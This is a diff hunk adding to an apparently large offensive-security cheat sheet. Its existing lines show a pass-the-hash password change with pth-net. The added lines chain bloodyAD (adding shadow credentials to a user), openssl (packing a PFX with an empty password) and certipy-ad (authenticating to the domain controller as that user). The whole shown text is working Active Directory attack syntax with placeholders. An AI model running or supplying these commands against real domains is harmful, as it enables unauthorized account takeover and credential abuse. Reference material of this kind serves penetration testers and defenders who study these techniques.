@@ -8072,6 +8072,20 @@ python3 getnthash.py <DOMAIN>/<USERNAME> -key <KEY>
 pth-net rpc password '<USERNAME>' '<PASSWORD>' -U '<DOMAIN>'/'<USERNAME>'%'<HASH>':'<HASH>' -S '<RHOST>'
 ```
 
+or
+
+```console
+bloodyAD -d <DOMAIN> -u '<USERNAME>' -k ccache=<FILE>.ccache --host <HOSTNAME> --dc-ip <RHOST> add shadowCredentials '<USERNAME>'
+```
+
+```console
+openssl pkcs12 -export -in <CERT>.pem -inkey <FILE>.pem -out <FILE>.pfx -passout pass:
+```
+
+```console
+certipy-ad auth -pfx <FILE>.pfx -dc-ip <RHOST> -domain <DOMAIN> -username '<USERNAME>'
+```
+
 #### smbpasswd
 
 ```shell
